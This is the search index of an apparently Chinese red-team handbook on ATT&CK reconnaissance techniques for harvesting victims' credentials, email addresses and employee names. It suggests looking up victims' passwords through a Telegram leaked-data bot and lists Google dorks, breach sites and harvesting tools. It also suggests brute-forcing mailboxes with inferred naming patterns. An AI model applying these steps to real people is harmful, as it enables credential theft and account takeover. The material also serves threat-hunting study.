{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\ud83d\udc79RedBook","text":"<p>\u5728Threathunting-book\u548cMITRE ATT&amp;CK\u9879\u76ee\u57fa\u7840\u4e0a\u8fdb\u884c\u5b8c\u5584\u7684\u72e9\u730e\u89c6\u89d2\u7ea2\u961fhandbook\uff0c\u611f\u8c22\u539f\u4f5c\u8005\u4eec\u7684\u52aa\u529b\u3002</p>"},{"location":"#_1","title":"\u76ee\u5f55","text":"<ul> <li>\u4fa6\u5bdf</li> <li>\u8d44\u6e90\u5f00\u53d1</li> <li>\u521d\u59cb\u8bbf\u95ee</li> <li>\u6267\u884c</li> <li>\u6743\u9650\u7ef4\u6301</li> <li>\u6743\u9650\u63d0\u5347</li> <li>\u9003\u907f\u8ffd\u8e2a</li> <li>\u51ed\u8bc1\u83b7\u53d6</li> <li>\u53d1\u73b0</li> <li>\u6a2a\u884c\u79fb\u52a8</li> <li>\u547d\u4ee4\u4e0e\u63a7\u5236</li> <li>\u6e17\u51fa</li> <li>\u5f71\u54cd</li> </ul> <p>\u8fd9\u662f\u6211\u7684\u90ae\u7bb1\ud83d\udcee\uff1a<code>contact@y1ng.org</code> \u6b22\u8fce\u4ea4\u6d41\uff01</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/","title":"T1589-001-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u51ed\u8bc1","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u51ed\u8bc1\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u653b\u51fb\u8005\u6536\u96c6\u7684\u5e10\u6237\u51ed\u636e\u53ef\u4ee5\u662f\u4e0e\u76ee\u6807\u53d7\u5bb3\u8005\u7ec4\u7ec7\u76f4\u63a5\u76f8\u5173\u7684\u51ed\u636e\uff0c\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u7528\u6237\u503e\u5411\u4e8e\u5728\u4e2a\u4eba\u5e10\u6237\u548c\u4f01\u4e1a\u5e10\u6237\u4e2d\u4f7f\u7528\u76f8\u540c\u5bc6\u7801\u7684\u8d8b\u52bf\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u7f51\u7ad9\u8ba4\u8bc1cookie\u7684\u6076\u610f\u5185\u5bb9\u3002\u51ed\u8bc1\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f15\u64ce\uff0c\u6cc4\u9732\u51ed\u636e\u8f6c\u50a8\uff0c\u4ee3\u7801\u4ed3\u5e93\u7b49\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4ece\u6697\u7f51\u6216\u5176\u4ed6\u9ed1\u5e02\u8d2d\u4e70\u51ed\u8bc1\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5165\u4fb5\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u6709\u6548\u8d26\u53f7\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f8b\u5982\uff1a\u5728tg-sgk\u673a\u5668\u4eba\u5904\u76f4\u63a5\u8f93\u5165\u53d7\u5bb3\u8005\u7684\u90ae\u7bb1\u3001\u5fae\u535a\u5730\u5740\u3001\u624b\u673a\u53f7\u7801\u3001QQ\u7b49\u8fdb\u884c\u67e5\u5bfb\u53d7\u5bb3\u8005\u7684\u5bc6\u7801\u4fe1\u606f\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1589-001</p> <p>https://attack.mitre.org/techniques/T1589/001/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/","title":"T1589-002-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u90ae\u7bb1\u5730\u5740","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u90ae\u4ef6\u5730\u5740\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u5373\u4f7f\u5b58\u5728\u5185\u90e8\u5b9e\u4f8b\uff0c\u7ec4\u7ec7\u4e5f\u53ef\u80fd\u5177\u6709\u5916\u90e8\u7684\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\u548c\u5458\u5de5\u90ae\u7bb1\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u5730\u6536\u96c6\u90ae\u4ef6\u5730\u5740\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u83b7\u5f97\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u793e\u4ea4\u5a92\u4f53\u6216\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u90ae\u4ef6\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6536\u96c6\u90ae\u7bb1\u4fe1\u606f\u4e3b\u8981\u6709\u4e24\u4e2a\u4f5c\u7528\uff1a</p> <ul> <li>\u901a\u8fc7\u53d1\u73b0\u76ee\u6807\u7cfb\u7edf\u8d26\u53f7\u7684\u547d\u540d\u89c4\u5f8b\uff0c\u53ef\u4ee5\u7528\u6765\u540e\u671f\u767b\u5165\u5176\u4ed6\u5b50\u7cfb\u7edf\u3002</li> <li>\u7206\u7834\u767b\u5165\u90ae\u7bb1\u7528\u3002</li> </ul> <p>\u901a\u5e38\u90ae\u7bb1\u7684\u8d26\u53f7\u6709\u5982\u4e0b\u51e0\u79cd\u751f\u6210\u89c4\u5f8b\uff1a \u6bd4\u5982\u67d0\u516c\u53f8\u6709\u5458\u5de5\u540d\u53eb\u505a\u201c\u5f20\u5c0f\u4e09\u201d\uff0c\u5b83\u7684\u90ae\u7bb1\u53ef\u80fd\u5982\u4e0b\uff1a</p> <pre><code>zhangxiaosan@xxx.com\nxiaosan.zhang@xxx.com\nzxiaosan@xxx.com\n</code></pre> <p>\u5f53\u6211\u4eec\u6536\u96c6\u51e0\u4e2a\u90ae\u7bb1\u4e4b\u540e\uff0c\u4fbf\u4f1a\u5927\u81f4\u731c\u51fa\u5bf9\u65b9\u90ae\u7bb1\u7684\u547d\u540d\u89c4\u5f8b\u3002</p> <p>\u9664\u4e86\u5458\u5de5\u7684\u90ae\u7bb1\u4e4b\u5916\uff0c\u6709\u4e00\u4e9b\u5171\u6709\u7684\u90ae\u7bb1\uff0c\u6bd4\u5982\u4eba\u529b\u7684\u90ae\u7bb1\u3001\u5ba2\u670d\u7684\u90ae\u7bb1\uff0chr@xxx.com\u3001kefu@xxx.com,\u8fd9\u79cd\u90ae\u7bb1\u6709\u65f6\u4f1a\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u5728\u6e17\u900f\u65f6\u53ef\u989d\u5916\u7559\u610f\u4e00\u4e0b\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u624b\u5de5\u6216\u8005\u5de5\u5177\u7684\u65b9\u5f0f\u6765\u786e\u5b9a\u641c\u96c6\u90ae\u7bb1\uff1a</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_2","title":"\u624b\u5de5\u65b9\u5f0f","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#google-hacking","title":"Google Hacking","text":"<pre><code>site:target.com intext:@target.com\nsite:target.com \u90ae\u4ef6\nsite:target.com email\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#github","title":"github\u7b49\u7b2c\u4e09\u65b9\u6258\u7ba1\u5e73\u53f0","text":"<p>\u5728github\u4e2d\u641c\u7d22\u90ae\u7bb1\u540e\u7f00</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_3","title":"\u793e\u5de5\u5e93\u7684\u65b9\u5f0f","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#online-search-email","title":"Online Search Email","text":"<p>\u901a\u8fc7\u5168\u7403\u6700\u5927\u7684\u51e0\u4e2a\u6570\u636e\u6cc4\u9732\u7ad9\u70b9\u5728\u7ebf\u67e5\u8be2\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732\u60c5\u51b5</p> <p>https://monitor.firefox.com/</p> <p>https://haveibeenpwned.com/</p> <p>https://ghostproject.fr/</p> <p>https://hunter.io/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_4","title":"\u5de5\u5177\u7c7b","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#the-harvester","title":"The Harvester","text":"<p>The Harvester\u53ef\u7528\u4e8e\u641c\u7d22Google\u3001Bing\u548cPGP\u670d\u52a1\u5668\u7684\u7535\u5b50\u90ae\u4ef6\u3001\u4e3b\u673a\u4ee5\u53ca\u5b50\u57df\u540d,\u56e0\u6b64\u9700\u8981\u7ffb\u5899\u8fd0\u884c\u8be5\u5de5\u5177\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#infoga","title":"Infoga","text":"<p>Infoga\u53ef\u4ece\u4e0d\u540c\u7684\u516c\u5171\u6e90\u7f51\u7edc\uff08\u641c\u7d22\u5f15\u64ce\uff0cpgp\u5bc6\u94a5\u670d\u52a1\u5668\u548cshodan\uff09\u6536\u96c6\u7535\u5b50\u90ae\u4ef6\u5e10\u6237\u4fe1\u606f\uff08ip\uff0c\u4e3b\u673a\u540d\uff0c\u56fd\u5bb6/\u5730\u533a\uff09\u3002\u662f\u4e00\u4e2a\u7528\u6cd5\u975e\u5e38\u7b80\u5355\u7684\u5de5\u5177\uff0c\u4f46\u662f\uff0c\u5bf9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u7684\u65e9\u671f\u9636\u6bb5\uff0c\u6216\u8005\u53ea\u662f\u4e3a\u4e86\u4e86\u89e3\u81ea\u5df1\u516c\u53f8\u5728\u4e92\u8054\u7f51\u4e0a\u7684\u53ef\u89c1\u6027\u662f\u975e\u5e38\u6709\u6548\u7684\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_5","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_6","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_9","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1589-002</p> <p>https://attack.mitre.org/techniques/T1589/002/</p> <p>\u90ae\u7bb1\u4fe1\u606f\u6536\u96c6.\u767d\u5e3d\u4e0e\u5b89\u5168</p> <p>https://www.kancloud.cn/noahs/src_hacker/2119944</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/","title":"T1589-003-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u5458\u5de5\u59d3\u540d","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u5458\u5de5\u59d3\u540d\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u5458\u5de5\u59d3\u540d\u7528\u4e8e\u5bfc\u51fa\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff0c\u4ee5\u53ca\u5e2e\u52a9\u6307\u5bfc\u5176\u4ed6\u4fa6\u5bdf\u5de5\u4f5c\u6216\u5236\u4f5c\u66f4\u53ef\u4fe1\u7684\u8bf1\u9975\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u5730\u6536\u96c6\u5458\u5de5\u59d3\u540d\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u83b7\u5f97\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u793e\u4ea4\u5a92\u4f53\u6216\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5165\u4fb5\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\u6216\u6709\u6548\u8d26\u53f7\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f8b\u5982\uff1a\u6bd4\u5982\u76f4\u63a5\u901a\u8fc7\u8d2d\u4e70\u4e00\u4e9b\u62db\u8058\u7f51\u7ad9\u4e0a\u7684\u8d26\u53f7\u5373\u53ef\u67e5\u770b\u4f01\u4e1a\u7684\u5458\u5de5\u7684\u59d3\u540d\u4fe1\u606f\u3002\u540c\u6837\u62db\u8058\u7f51\u7ad9\u5177\u5907\u793e\u4ea4\u5c5e\u6027\u7684\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u83b7\u53d6\u5230\u76f8\u5173\u5458\u5de5\u7684\u59d3\u540d\u4fe1\u606f\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1589-003</p> 